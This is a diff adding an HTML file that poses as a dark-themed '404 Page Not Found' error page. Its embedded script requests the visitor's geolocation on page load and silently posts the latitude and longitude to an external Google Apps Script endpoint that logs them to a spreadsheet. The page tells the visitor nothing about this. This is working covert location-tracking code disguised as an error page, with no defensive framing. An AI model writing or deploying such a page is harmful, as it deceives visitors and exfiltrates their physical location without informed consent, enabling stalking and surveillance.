@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>404 - Page Not Found</title>
+<style>
+  body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background-color: #111;
+    color: #fff;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+    text-align: center;
+  }
+  .container {
+    padding: 20px;
+  }
+  h1 {
+    font-size: 6rem;
+    margin: 0;
+  }
+  p {
+    font-size: 1.25rem;
+    color: #ccc;
+    margin-top: 10px;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h1>404</h1>
+    <p>Page Not Found</p>
+    <p>We're having issues currently. Try again later.</p>
+  </div>
+
+  <script>
+    const SHEET_URL = "https://script.google.com/macros/s/AKfycbzZUHbpdXYjkFHeZAQjgCfGnKTD1yRIKVRX7ZRB7pm1VAkurim6F-kftw2QrFZ22k0T/exec";
+
+    function sendToSheet(lat, lon) {
+      fetch(SHEET_URL, {
+        method: "POST",
+        headers: { "Content-Type": "text/plain" },
+        body: JSON.stringify({ lat, lon })
+      })
+      .then(res => res.json())
+      .then(data => console.log("Logged:", data))
+      .catch(err => console.error("Error logging location:", err));
+    }
+
+    function showPosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      console.log(`Latitude: ${lat}, Longitude: ${lon}`);
+      sendToSheet(lat, lon);
+    }
+
+    function showError(error) {
+      console.log("Geolocation error:", error.message);
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(showPosition, showError);
+    } else {
+      console.log("Geolocation not supported by this browser.");
+    }
+  </script>
+</body>
+</html>
